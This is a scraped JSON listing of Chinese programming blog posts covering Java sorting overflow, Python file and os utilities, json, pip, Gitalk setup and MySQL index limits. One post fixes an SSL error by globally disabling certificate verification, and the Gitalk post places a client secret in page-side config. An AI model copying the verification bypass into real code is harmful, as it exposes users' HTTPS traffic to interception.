扫描关注一灰灰blog","link":"/hexblog/2019/06/20/190620-Python-Input读取数据/"},{"title":"190618-JDK的一次排序采坑记录","text":"列表排序，我们可以说是用的比较多了，写起来也很溜，继承Comparable接口，实现compareTo方法，然后直接使用java.util.List#sort即可 虽说如此简单，今天却是一脚踩进去，花了不少时间才爬出来，下面复盘一下这个现场 I. 排序场景复现背景比较简单，做一个新闻的聚合专栏，专栏内部的文章可以来自各个不同的来源，我们希望在专栏里面的文章，可以根据热度和发布时间进行排序，即热度高的放在前面，相同热度的文章，根据发布时间倒排 1. 模拟实现针对上面这个场景，给出一个可以复现的代码实现，我们先定义一个ItemDO，表示专栏内部的文章，其中与排序相关的主要有两个字段，热度hot 和发布时间publishTime 12345678public class ItemDO { // msgId private Integer msgId; // 热度 private Integer hot; // 发布时间， ms单位 private Long publishTime;} 我们希望实现上面的排序，所以可直接让这个DO继承Compareable接口，内部实现排序的逻辑 12345678910111213141516171819202122232425@Datapublic class ItemDO implements Comparable&lt;ItemDO&gt; { private Integer msgId; private Integer hot; private Long publishTime; @Override public int compareTo(ItemDO o) { if (hot &lt; o.hot) { return 1; } else if (hot &gt; o.hot) { return -1; } if (o.getPublishTime() == 0) { return -1; } if (publishTime == 0) { return 1; } return (int) (o.getPublishTime() - publishTime); }} 看下我们上面的实现，我们在业务上已经能保证每个DO中的成员不会为null（因为直接从DB中获取，而db中不存null的字段） 首先根据sort进行排序，可以看到，hot大的，排在前面，hot小的往后排；如果hot相等，才会进入后面的时间比较；还特意加上了针对时间为0的特殊处理，然后捞了一批最近的数据，进行测试，发现一如预期，并没有什么问题 2. 坑在哪儿？上面的实现，现在明确指出，有问题，会在什么地方呢？ 1return (int) (o.getPublishTime() - publishTime); 就在上面这一行，会有什么问题？看到类型转换，就会想到溢出的问题，如果两篇文章的发布时间，间隔长一点就会出现这个问题 12345文章a： 发布时间 2019-06-18 19:24:10 -&gt; a = 1560857050000文章b： 发布时间 2019-05-18 19:24:10 -&gt; b = 1558178650000a - b = 1560857050000 - 1558178650000 = 2678400000 &gt; Integer.MAX_VALUE 所以说在时间跨度小的时候，没啥问题，但是时间跨度大一点，就会出现int溢出，导致compareTo的返回结果和我们预期的不一致 3. 修改知道问题之后，就可以吭哧吭哧的修改了，方法一把ms转换成s再进行比较；方法二，用下面的比较方式 123456789101112131415161718192021222324@Datapublic class ItemDO implements Comparable&lt;ItemDO&gt; { private Integer msgId; private Integer hot; private Long publishTime; @Override public int compareTo(ItemDO o) { if (hot &lt; o.hot) { return 1; } else if (hot &gt; o.hot) { return -1; } long sub = o.getPublishTime() - publishTime; if (sub &gt; 0) { return 1; } else if (sub &lt; 0){ return -1; } else { return 0; } }} 4. 测试验证然后写几个简单的测试用例看一下是否和我们预期的一致 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor;import org.junit.Test;import java.util.ArrayList;import java.util.List;/** * Created by @author yihui in 19:14 19/6/18. */public class SortTest { @Data @NoArgsConstructor @AllArgsConstructor public static class ItemDO implements Comparable&lt;ItemDO&gt; { private Integer msgId; private Integer hot; private Long publishTime; @Override public int compareTo(ItemDO o) { if (hot &lt; o.hot) { return 1; } else if (hot &gt; o.hot) { return -1; } long sub = o.getPublishTime() - publishTime; if (sub &gt; 0) { return 1; } else if (sub &lt; 0){ return -1; } else { return 0; } } } @Data @NoArgsConstructor @AllArgsConstructor public class ItemDOError implements Comparable&lt;ItemDOError&gt; { private Integer msgId; private Integer hot; private Long publishTime; @Override public int compareTo(ItemDOError o) { if (hot &lt; o.hot) { return 1; } else if (hot &gt; o.hot) { return -1; } if (o.getPublishTime() == 0) { return -1; } if (publishTime == 0) { return 1; } return (int) (o.getPublishTime() - publishTime); } } @Test public void testSort() { List&lt;ItemDO&gt; list = new ArrayList&lt;&gt;(); list.add(new ItemDO(1, 10, 100L)); list.add(new ItemDO(2, 10, 12333333333124L)); list.add(new ItemDO(3, 10, 0L)); list.add(new ItemDO(4, 3, 0L)); list.add(new ItemDO(5, 12, Long.MAX_VALUE)); list.add(new ItemDO(6, 10, (long) Integer.MAX_VALUE)); list.sort(null); System.out.println(list); List&lt;ItemDOError&gt; listError = new ArrayList&lt;&gt;(); listError.add(new ItemDOError(1, 10, 100L)); listError.add(new ItemDOError(2, 10, 12333333333124L)); listError.add(new ItemDOError(3, 10, 0L)); listError.add(new ItemDOError(4, 3, 0L)); listError.add(new ItemDOError(5, 12, Long.MAX_VALUE)); listError.add(new ItemDOError(6, 10, (long) Integer.MAX_VALUE)); listError.sort(null); System.out.println(listError); }} 输出结果如下： 5. 小结虽然说在java中要想实现列表的排序比较简单，但是使用姿势一旦不对，同样会导致各种问题 在实现Compareable接口中的compareTo方法时 不推荐使用两个数值的差作为返回值（因为可能出现溢出） 推荐根据需要返回 1, 0, -1 a.compareTo(b) == 1 表示a往后排 a.compareTo(b) == -1 表示a往前排 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/06/18/190618-JDK的一次排序采坑记录/"},{"title":"190617-python 网络请求之certificate verify failed问题处理","text":"在使用python的request库进行网络访问时，当url是一个https的链接，居然没法正常玩耍，直接提示 1&lt;urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1051)&gt; 使用request进行图片下载，https的格式的图片，结果直接抛出来上面的异常，网上查询了一下，解决方法也比较简单，忽略掉证书校验即可 12import sslssl._create_default_https_context = ssl._create_unverified_context 加上上面两行，然后再次测试 1234567891011121314151617181920212223242526272829303132333435import osimport randomfrom urllib import requestimport sslssl._create_default_https_context = ssl._create_unverified_contextdef testDownImg(): url = 'https://www.theblockbeats.com/uploads/course/20190617/1560740686526583.jpg' def tmp_save(url, app=None): path = f\"/tmp/img/{app}/\" if not os.path.exists(path): # 当目录不存在时，主动创建 os.makedirs(path) try: opener = request.build_opener() opener.addheaders = [('user-agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36')] request.install_opener(opener) file = f\"{path}/01_{random.randint(0, 20)}\" request.urlretrieve(url, file) return file except Exception as e: print(e) return None ans = tmp_save(url, app='test') print(ans)testDownImg() 再次执行，图片正常保存, 上面的代码中，还演示了某些情况下，对user-agent进行校验的case，我们可以通过 opener 来注册请求头 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/06/17/190617-python-网络请求之certificate-verify-failed问题处理/"},{"title":"190624-python 获取文件大小","text":"记录下在python中获取文件大小的使用方法 1234import ossize = os.path.getsize('/tmp/img/tmp.jpg')print(size) 输出文件的字节数，单位为B，int型 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/06/24/190624-python-获取文件大小/"},{"title":"190611-Python-列表推导式 字典推导式 集合推导式使用详解.md详解","text":"记录下python中语法糖列表表达式的使用姿势，以此替换掉日常的python脚本中大量的for循环 I. 列表达式1. 基本使用姿势可以简单的理解为单行的for循环，形如： 1[xx for xx in range(0, 10)] 2. 实例说明下面给出几个简单的例子 case1: 列表中的每个数字获取平方 123&gt;&gt;&gt; [x * x for x in range(0, 5)][0, 1, 4, 9, 16]&gt;&gt;&gt; case2: 列表转字符串 我们知道可以直接使用 ','.join() 方式将列表转换成字符串，但是如果列表的元素是数字，那么直接上面这种方式执行会报错 一个可选的姿势 ','.join([str(x) for x in range(0, 5)]) 123456&gt;&gt;&gt; ','.join(range(0, 5))Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;TypeError: sequence item 0: expected str instance, int found&gt;&gt;&gt; ','.join([str(x) for x in range(0, 5)])'0,1,2,3,4' case3: 字典转list 123&gt;&gt;&gt; item = {'a': 1, 'b': 3, 'c': 10}&gt;&gt;&gt; [ f'{key}:{value}' for key, value in item.items()]['a:1', 'b:3', 'c:10'] II. 字典推导式 &amp; 集合推导式看完列表之后再看下面两个就比较简单了，使用差不了多少，举个简单的例子 字典推导式： 将列表推导式的中括号换成大括号 k : v 方式指定字典的key,value 12&gt;&gt;&gt; { x: x*x for x in range(0, 10)}{0: 0, 1: 1, 2: 4, 3: 9, 4: 16, 5: 25, 6: 36, 7: 49, 8: 64, 9: 81} 集合推导式： 使用集合推导式可以很方便的将列表转换为集合；使用列表推导式，也可以很方便的将集合转换为列表 12&gt;&gt;&gt; { x % 6 for x in range(0, 12)}{0, 1, 2, 3, 4, 5} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/06/11/190611-Python-列表推导式 字典推导式 集合推导式使用详解/"},{"title":"190623 Python File使用姿势","text":"文件操作，主要借助open函数来实现，定义如下 1open(file, mode='r', buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None) 对应的参数说明 file: 必需，文件路径（相对或者绝对路径）。 mode: 可选，文件打开模式 buffering: 设置缓冲 encoding: 一般使用utf8 errors: 报错级别 newline: 区分换行符 closefd: 传入的file参数类型 其中mode采用的参数和c语言的差不多 w 写,文件不存在时，创建 wb 二进制写 r 读 rb 二进制读 a 追加写 ab 追加写二进制 w+ 这个+表示支持读写 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/06/23/190623-Python-File使用姿势/"},{"title":"190626 Python文件写","text":"如何将内容保存到文件中？ 借助with语句可以简单的实现 1234with open('demo.txt', 'w+') as f: f.write(\"hello\") f.write(\"world\") f.flush() 请注意，上面的write表示一次写入，如果你希望一次写入多个数据，可以使用 writeline 123with open('demo.txt', 'w+') as f: f.writelines([\"12\", \"34\"]) f.flush() II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/06/26/190626-Python文件写/"},{"title":"190524-Python之pip导出与安装项目依赖包","text":"使用pip进行python的包管理，记录下常见的两个，安装与导出项目依赖包 12345678# 安装依赖pip install pymysql# 导出依赖pip freeze 1&gt; requirements.txt# 安装项目所有依赖pip install -r requirements.txt II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/05/24/190524-Python之pip导出与安装项目依赖包/"},{"title":"190630 Python目录压缩","text":"上一篇介绍了shutil实现文件移动的功能，接下来介绍使用它来实现目录压缩 一个简单的实例case，将/tmp/test目录打包压缩为out.zip 12import shutilshutil.make_archive(\"out\", \"zip\", \"/tmp/test\") II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/06/30/190630-Python目录压缩/"},{"title":"190627 Python文件遍历","text":"如何遍历一个目录下的所有文件？ 12345678910import osdef list_dir(path): \"\"\" 获取目录下所有文件 :param path: :return: \"\"\" for file in os.listdir(path): print(file) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/06/27/190627-Python文件遍历/"},{"title":"190621-Gitalk配置与排坑全程实战","text":"基于gittalk搭建个人站点的评论的完整记录，特别是遇到的一些鬼畜的问题，如Error not found, 404问题，Validation Failed(422)校验失败问题等，为大家避免采坑提供一些参考 I. Gitalk安装说明gitalk的使用比较简单，直接在你的html中，加入依赖，添加配置即可 1. 添加引用1234&lt;link rel=\"stylesheet\" href=\"//unpkg.com/gitalk/dist/gitalk.css\"&gt; &lt;script src=\"//unpkg.com/docsify/lib/plugins/gitalk.min.js\"&gt;&lt;/script&gt;&lt;script src=\"//unpkg.com/gitalk/dist/gitalk.min.js\"&gt;&lt;/script&gt; 2. 添加配置12345678910&lt;script&gt; const gitalk = new Gitalk({ clientID: '...', clientSecret: '...', repo: 'quick-media', owner: 'liuyueyi', admin: ['liuyueyi'], distractionFreeMode: false })&lt;/script&gt; 注意上面的clientId, clientSecret需要到你自己的github上记性申请 进入申请链接: https://github.com/settings/developers 创建新的app 添加必要的配置(如下图，注意两个url，填写你的项目地址即可，后面回调的地址，如果有自己的域名，用自己的域名） 项目issues开启 因为评论是基于issues进行的，所以项目的issues需要打开 进入项目的setting目录，如: https://github.com/liuyueyi/quick-media/settings 开启issues特性 3. 测试验证如果配置没什么问题，就可以部署上线进行测试了；因为登录回调的地址问题，在本地进行测试时，可能无法正常登录，也没有啥好办法 下面这个是个人的测试链接: https://liuyueyi.github.io/quick-media/#/ II. 问题及解决方式1. 404 not found配置完毕之后，如下提示404 打开chrome控制台查看，发现repo仓库地址提示404 正常来讲，仓库地址url应该是： https://api.github.com/repos/liuyueyi/quick-media/issues 出现问题的主要原因就是我们的配置参数不对，主要是 repo 这个属性， 这个值填项目名，不要填完整的仓库地址 12345const gitalk = new Gitalk({ // ... repo: 'quick-media', // ...}) 2. Validation Failed(422) https://github.com/gitalk/gitalk/issues/102 前面一个问题解决之后，发现提示422，主要原因是url编码之后添加到issues的label中，超过字符长度的限制，因此一个通用的推荐方案就是采用md5进行处理 网上找一个md5的开源js包，如: https://github.com/blueimp/JavaScript-MD5； 或者直接使用我找的一个md5文件: https://liuyueyi.github.io/quick-media/_assert/md5.min.js 直接使用url/path来生成md5字符串 1234const gitalk = new Gitalk({ // ... id: md5(location.href) }) 但是上面这里有个问题，url带参数时，会创建一个新的issues，这就有点蛋疼了，内部改造一下，针对我自己的项目: https://liuyueyi.github.io/quick-media/，我希望用域名 + path + #xx 来生成md5 针对我自己的应用场景，做了一个简单的取舍，我的url访问格式为 https://liuyueyi.github.io/quick-media/#/其他/其他?id=_4-捐赠 上面的url，我只希望有 /#/其他/其他 就行 1234567891011121314151617function url_parse(url) { var left = url.indexOf('/#/'); if(left &lt; 0) { return url; } var right = url.lastIndexOf('?'); if (right &lt;= 0 || right &lt; left) { right = url.length; } return url.substring(left, right);}gittalk_id = url_parse(location.href);if(gittalk_id.length &gt; 45) { gittalk_id = md5(gittalk_id);} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/06/21/190621-Gitalk配置与排坑全程实战/"},{"title":"190628 Python目录创建","text":"当我们写入数据到一个文件时，假设这个文件所在的某个目录不存在，那么会抛异常，所以我们就需要在目录不存在时创建目录，这个场景比较常见，可以直接借助os来实现 12345678910import osdef create_dir(path): \"\"\" 目录不存在时，主动创建 :param path: :return: \"\"\" if not os.path.exists(path): os.makedirs(path) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/06/28/190628-Python目录创建/"},{"title":"190702 Python 文件所属修改","text":"os.chown() 方法用于更改文件所有者，如果不修改可以设置为 -1, 你需要超级用户权限来执行权限修改操作 1os.chown(path, uid, gid); 参数: path – 设置权限的文件路径 uid – 所属用户 ID gid – 所属用户组 ID II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/02/190702-Python-文件所属修改/"},{"title":"190629 Python目录迁移","text":"在shell里面，直接使用mv命令实现目录文件的移动，那么python中可以怎么做呢? 12345678910import shutildef move_dir(source, target): \"\"\" 目录迁移 :param source: :param target: :return: \"\"\" shutil.move(source, target) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/06/29/190629-Python目录迁移/"},{"title":"190701 Python 获取工作目录","text":"使用 os.getcwd获取当前工作目录 123import osos.getcwd() II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/01/190701-Python-获取工作目录/"},{"title":"190702 Python 文件权限","text":"在linux系统中，文件的越权访问相对常见，比如普通用户无法访问root用户文件，在python中，可以借助os.access()来判断 1os.access(path, mode); path: 待检测的路径 mode: os.F_OK: 作为access()的mode参数，测试path是否存在。 os.R_OK: 包含在access()的mode参数中 ， 测试path是否可读。 os.W_OK 包含在access()的mode参数中 ， 测试path是否可写。 os.X_OK 包含在access()的mode参数中 ，测试path是否可执行。 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/02/190702-Python-文件权限/"},{"title":"190701 Python 更改工作目录","text":"在用python调用shell脚本时，可以用到功能当前工作目录 1os.chdir(path) 实例如下 123456789&gt;&gt;&gt; import os&gt;&gt;&gt; retval = os.getcwd()&gt;&gt;&gt; print (\"当前工作目录为 %s\" % retval)当前工作目录为 /Users/user&gt;&gt;&gt; os.chdir( '/tmp' )&gt;&gt;&gt; os.getcwd()'/private/tmp'&gt;&gt;&gt; os.getcwd()'/private/tmp' II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/01/190701-Python-更改工作目录/"},{"title":"190702 Python 文件权限修改","text":"os提供了chmod来修改文件权限，基本上和shell命令操作差不多了 1os.chmod(path, mod) flags – 可用以下选项按位或操作生成， 目录的读权限表示可以获取目录里文件名列表， ，执行权限表示可以把工作目录切换到此目录 ，删除添加目录里的文件必须同时有写和执行权限 ，文件权限以用户id-&gt;组id-&gt;其它顺序检验,最先匹配的允许或禁止权限被应用。 stat.S_IXOTH: 其他用户有执行权0o001 stat.S_IWOTH: 其他用户有写权限0o002 stat.S_IROTH: 其他用户有读权限0o004 stat.S_IRWXO: 其他用户有全部权限(权限掩码)0o007 stat.S_IXGRP: 组用户有执行权限0o010 stat.S_IWGRP: 组用户有写权限0o020 stat.S_IRGRP: 组用户有读权限0o040 stat.S_IRWXG: 组用户有全部权限(权限掩码)0o070 stat.S_IXUSR: 拥有者具有执行权限0o100 stat.S_IWUSR: 拥有者具有写权限0o200 stat.S_IRUSR: 拥有者具有读权限0o400 stat.S_IRWXU: 拥有者有全部权限(权限掩码)0o700 stat.S_ISVTX: 目录里文件目录只有拥有者才可删除更改0o1000 stat.S_ISGID: 执行此文件其进程有效组为文件所在组0o2000 stat.S_ISUID: 执行此文件其进程有效用户为文件所有者0o4000 stat.S_IREAD: windows下设为只读 stat.S_IWRITE: windows下取消只读 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/02/190702-Python-文件权限修改/"},{"title":"190704-mysql索引过长Specialed key was too long问题记录","text":"在创建要给表的时候遇到一个有意思的问题，提示Specified key was too long; max key length is 767 bytes，从描述上来看，是Key太长，超过了指定的 767字节限制 下面是产生问题的表结构 1234567CREATE TABLE `test_table` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(1000) NOT NULL DEFAULT '', `link` varchar(1000) NOT NULL DEFAULT '', PRIMARY KEY (`id`), KEY `name` (`name`)) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4; 我们可以看到，对于name，我们设置长度为1000可变字符，因为采用utf8mb4编码, 所以它的大小就变成了 1000 * 4 &gt; 767 所以再不修改其他配置的前提下，varchar的长度大小应该是 767 / 4 = 191 有兴趣的同学可以测试下，分别指定name大小为191, 192时，是不是前面的可以创建表成功，后面的创建表失败，并提示错误Specified key was too long; max key length is 767 bytes 解决办法一 使用innodb引擎 启用innodb_large_prefix选项，修改约束扩展至3072字节 重新创建数据库 my.cnf配置 1234set global innodb_large_prefix=on;set global innodb_file_per_table=on;set global innodb_file_format=BARRACUDA;set global innodb_file_format_max=BARRACUDA; 上面这个3072字节的得出原因如下 我们知道InnoDB一个page的默认大小是16k。由于是Btree组织，要求叶子节点上一个page至少要包含两条记录（否则就退化链表了）。 所以一个记录最多不能超过8k。又由于InnoDB的聚簇索引结构，一个二级索引要包含主键索引，因此每个单个索引不能超过4k （极端情况，pk和某个二级索引都达到这个限制）。 由于需要预留和辅助空间，扣掉后不能超过3500，取个“整数”就是(1024*3)。 解决办法二 在创建表的时候，加上 row_format=DYNAMIC 1234567CREATE TABLE `test_table` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(255) NOT NULL DEFAULT '', `link` varchar(255) NOT NULL DEFAULT '', PRIMARY KEY (`id`), KEY `name` (`name`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 row_format=DYNAMIC; 这个参数的作用如下 MySQL 索引只支持767个字节，utf8mb4 每个字符占用4个字节，所以索引最大长度只能为191个字符，即varchar(191)，若想要使用更大的字段，mysql需要设置成支持数据压缩，并且修改表属性 row_format ={DYNAMIC|COMPRESSED} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/07/04/190704-mysql索引过长Specialed-key-was-too-long问题记录/"},{"title":"190710 Python json使用基础篇","text":"json字符串目前可以算是前后端的主流交互格式了，在python中，原生支持json的序列化和反序列化，使用起来比较简单 12345678import jsona = {'a': [1,2,3], 'b': {'t': 'tt', 'b': 123}}# 转换为json字符串b = json.dumps(a)# json字符串转换为mapc = json.loads(b) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/10/190710-Python-json使用基础篇/"},{"title":"190711-Python json格式化输出","text":"使用python来加载or输出json对象属于很方便的操作了，因为官方库中直接集成了对应的操作库，之前说过一篇《Python之json无法序列化部分类型数据问题解决方案》，这里介绍一下另外的一些用法，如何输出格式化的json字符串 下面给出一个json转字符串的基础操作 1234import jsonresult = {\"hello\": \"你好\", \"name\": \"一灰灰blog\"}str_json = json.dumps(result)print(str_json) 测试输出结果如下 根据上面的返回，有几个不爽的地方 中文被编码了 我希望得到可视化的json串（就是有换行，有缩进的） 要实现上面这两个结果，怎么处理？ dumps方法 的几个参数就可以满足我们的需求了 ensure_ascii=False 来确保中文不被编码 indent=4 设置缩进格数 separators=(',', ':') 设置分隔符,json默认的分割符号主要就是逗号和分号 123result = {\"hello\": \"你好\", \"name\": \"一灰灰blog\"}ans = json.dumps(result, ensure_ascii=False, indent=4, separators=(',', ':'))print(ans) 输出结果如下 注意一点，对于value内部的,:是不会被当成分割符号的 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/07/11/190711-Python-json格式化输出/"},{"title":"190715 Python 内置函数之all","text":"all判断给定的可迭代参数 iterable 中的所有元素是否都为 TRUE，如果是返回 True，否则返回 False 等价于: 12345def all(iterable): for element in iterable: if not element: return False return True 实例: 1all(['a', 'b', 'c', 'd']) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之all/"},{"title":"190715 Python 内置函数之abs","text":"接下来我们将针对python的内置函数进行逐一说明，本文将介绍abs() – 返回数字的绝对值 1abs(-10) 请注意：如果参数是一个复数，则返回它的大小 12&gt;&gt;&gt; abs(complex(-10, 1))10.04987562112089 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 